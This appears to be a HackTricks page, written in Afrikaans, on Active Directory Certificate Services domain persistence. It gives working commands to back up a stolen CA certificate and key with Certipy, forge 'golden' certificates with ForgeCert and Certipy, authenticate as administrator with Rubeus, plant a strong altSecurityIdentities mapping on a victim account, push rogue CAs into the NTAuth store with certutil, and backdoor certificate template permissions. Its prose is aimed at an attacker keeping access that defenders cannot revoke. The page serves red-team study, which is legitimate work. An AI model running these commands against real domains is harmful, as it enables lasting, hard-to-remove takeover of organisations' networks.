# AD CS Domein-volharding

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n samevatting van die domein-persistensie tegnieke gedeel in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Kyk daar vir verdere besonderhede.

## Vervalsing van sertifikate met gesteelde CA-sertifikate (Golden Certificate) - DPERSIST1

Hoe kan jy raaksien dat 'n sertifikaat 'n CA-sertifikaat is?

Dit kan bepaal word dat 'n sertifikaat 'n CA-sertifikaat is indien verskeie voorwaardes nagekom word:

- Die sertifikaat is op die CA-bediener gestoor, met sy private sleutel beveilig deur die masjien se DPAPI, of deur hardeware soos 'n TPM/HSM indien die bedryfstelsel dit ondersteun.
- Beide die Issuer- en Subject-velde van die sertifikaat stem ooreen met die distinguished name van die CA.
- 'n "CA Version" uitbreiding is uitsluitlik teenwoordig in CA-sertifikate.
- Die sertifikaat het geen Extended Key Usage (EKU)-velde nie.

Om die private sleutel van hierdie sertifikaat te onttrek, is die `certsrv.msc`-hulpmiddel op die CA-bediener die ondersteunede metode via die ingeboude GUI. Nietemin, hierdie sertifikaat verskil nie van ander wat in die stelsel gestoor is nie; dus kan metodes soos die [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) vir onttrekking toegepas word.

Die sertifikaat en private sleutel kan ook met Certipy verkry word met die volgende opdrag:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Sodra die CA-sertifikaat en sy privaat sleutel in `.pfx`-formaat verkry is, kan gereedskap soos [ForgeCert](https://github.com/GhostPack/ForgeCert) gebruik word om geldige sertifikate te genereer:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Die gebruiker wat geteiken word vir sertifikaatvervalsing moet aktief wees en in staat wees om in Active Directory te autentiseer vir die proses om te slaag. Om 'n sertifikaat te vervals vir spesiale rekeninge soos krbtgt is ondoeltreffend.

Hierdie vervalste sertifikaat sal **geldig** wees tot die gespesifiseerde einddatum en sowel lank as die root CA-sertifikaat geldig is (gewoonlik van 5 tot **10+ jaar**). Dit is ook geldig vir **masjiene**, so in kombinasie met **S4U2Self**, kan 'n aanvaller **persistensie op enige domeinmasjien handhaaf** solank die CA-sertifikaat geldig is.\
Boonop kan die **sertifikate wat met hierdie metode gegenereer word** **nie herroep word nie**, aangesien die CA nie daarvan bewus is nie.

### Werking onder Strong Certificate Mapping Enforcement (2025+)

Sedert 11 Februarie 2025 (na die uitrol van KB5014754) stel domain controllers standaard **Full Enforcement** vir certificate mappings in. Prakties beteken dit jou vervalste sertifikate moet óf:

- 'n sterk binding aan die teikenrekening bevat (byvoorbeeld die SID security extension), of
- gepaard wees met 'n sterk, eksplisiete mapping op die teikenobjek se `altSecurityIdentities` attribuut.

'N betroubare benadering vir persistensie is om 'n vervalste sertifikaat te skep wat gekoppel is aan die gesteelde Enterprise CA en dan 'n sterk, eksplisiete mapping by die slagoffer-prinsipaal te voeg:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Aantekeninge
- As jy vervalste sertifikate kan opstel wat die SID security extension insluit, sal dié selfs onder Full Enforcement implisiet gemap word. Andersins, verkies eksplisiete sterk mappings. Sien [account-persistence](account-persistence.md) vir meer oor eksplisiete mappings.
- Herroeping help verdedigers hier nie: vervalste sertifikate is onbekend aan die CA-databasis en kan dus nie herroep word.

## Vertrou Skelm CA-sertifikate - DPERSIST2

Die `NTAuthCertificates`-objek is gedefinieer om een of meer **CA certificates** binne sy `cacertificate`-attribuut te bevat, wat Active Directory (AD) gebruik. Die verifikasieproses deur die **domeincontroller** behels dat die `NTAuthCertificates`-objek nagegaan word vir ’n inskrywing wat ooreenstem met die **CA specified** in die Issuer-veld van die autentiserende **sertifikaat**. Autentisering gaan voort as ’n ooreenkoms gevind word.

’n Self-ondertekende CA-sertifikaat kan deur ’n aanvaller by die `NTAuthCertificates`-objek gevoeg word, mits hulle beheer oor hierdie AD-objek het. Gewoonlik word slegs lede van die **Enterprise Admin**-groep, asook **Domain Admins** of **Administrators** in die **forest root’s domain**, toegelaat om hierdie objek te wysig. Hulle kan die `NTAuthCertificates`-objek wysig met `certutil.exe` deur die opdrag `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` te gebruik, of deur die [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) te gebruik.

Bykomende nuttige opdragte vir hierdie tegniek:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Hierdie vermoë is veral relevant wanneer dit saam met 'n vroeër uiteengesette metode gebruik word wat ForgeCert betrek om sertifikate dinamies te genereer.

> Mapping-oorwegings ná 2025: die plaas van 'n rogue CA in NTAuth vestig slegs vertroue in die uitgereikte CA. Om leaf certificates vir aanmelding te gebruik wanneer DCs in **Full Enforcement** is, moet die leaf óf die SID security extension bevat, óf daar moet 'n sterk eksplisiete mapping op die teikenobjek wees (byvoorbeeld, Issuer+Serial in `altSecurityIdentities`). Sien {{#ref}}account-persistence.md{{#endref}}.

## Kwaadaardige Verkeerde Konfigurasie - DPERSIST3

Geleenthede vir **persistence** deur wysigings aan security descriptor van AD CS-komponente is volop. Wysigings beskryf in die "[Domain Escalation](domain-escalation.md)" afdeling kan kwaadwillig geïmplementeer word deur 'n aanvaller met verhoogde toegang. Dit sluit die toevoeging van "control rights" (bv. WriteOwner/WriteDACL/etc.) by sensitiewe komponente in, soos:

- Die **CA-bediener se AD-rekenaar** object
- Die **CA-bediener se RPC/DCOM-bediener**
- Enige **afstammeling AD-objek of -houer** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (byvoorbeeld, die Certificate Templates container, Certification Authorities container, die NTAuthCertificates object, ens.)
- **AD-groepe wat regte toegeken is om AD CS te beheer** deur verstek of deur die organisasie (soos die ingeboude Cert Publishers group en enige van sy lede)

'n Voorbeeld van 'n kwaadwillige implementering sou behels dat 'n aanvaller met **verhoogde regte** in die domein die **`WriteOwner`** reg by die verstek **`User`** sjabloon voeg, met die aanvaller as die prinsipaal vir die reg. Om dit te eksploiteer, sou die aanvaller eers die eienaarskap van die `User`-sjabloon na homself verander. Daarna sou die `mspki-certificate-name-flag` op die sjabloon na `1` gestel word om `ENROLLEE_SUPPLIES_SUBJECT` te aktiveer, wat 'n gebruiker toelaat om 'n Subject Alternative Name in die versoek te verskaf. Vervolgens kan die aanvaller via die sjabloon **enroll**, 'n domain administrator naam as alternatiewe naam kies, en die verkrygde sertifikaat gebruik vir verifikasie as die DA.

Praktiese instellings wat aanvallers kan stel vir langtermyn domein-persistence (sien {{#ref}}domain-escalation.md{{#endref}} vir volle besonderhede en opsporing):

- CA-beleidsvlagte wat SAN vanaf versoekers toelaat (bv. die aktivering van `EDITF_ATTRIBUTESUBJECTALTNAME2`). Dit hou ESC1-agtige paaie exploitbaar.
- Sjabloon DACL of instellings wat uitreiking wat verifikasie ondersteun toelaat (bv. byvoeging van Client Authentication EKU, die aktivering van `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrole oor die `NTAuthCertificates` object of die CA-houers om kwaadwillige uitreikers voortdurend weer bekend te stel as verdedigers skoonmaak probeer doen.

> [!TIP]
> In geharde omgewings ná KB5014754, verseker die kombinasie van hierdie verkeerde konfigurasies met eksplisiete sterk mappings (`altSecurityIdentities`) dat jou uitgee of vervalste sertifikate bruikbaar bly selfs wanneer DCs sterk mapping afdwing.



## References

- Microsoft KB5014754 – Sertifikaatgebaseerde verifikasie-wijzigings op Windows domain controllers (afdwingingstydlyn en sterk mappinge). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
